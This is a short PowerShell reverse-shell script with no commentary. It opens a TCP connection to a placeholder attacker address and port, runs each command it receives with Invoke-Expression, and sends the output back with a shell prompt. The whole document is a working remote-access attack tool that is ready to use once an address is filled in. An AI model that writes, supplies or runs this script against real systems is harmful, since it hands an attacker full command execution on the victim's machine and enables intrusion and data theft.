$ip = "x.x.x.x"
$port = yyyy

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object byte[] 1024
$encoding = New-Object Text.ASCIIEncoding

while (($i = $stream.Read($buffer, 0, 1024)) -ne 0) {
    $data = $encoding.GetString($buffer, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = $encoding.GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

$client.Close()
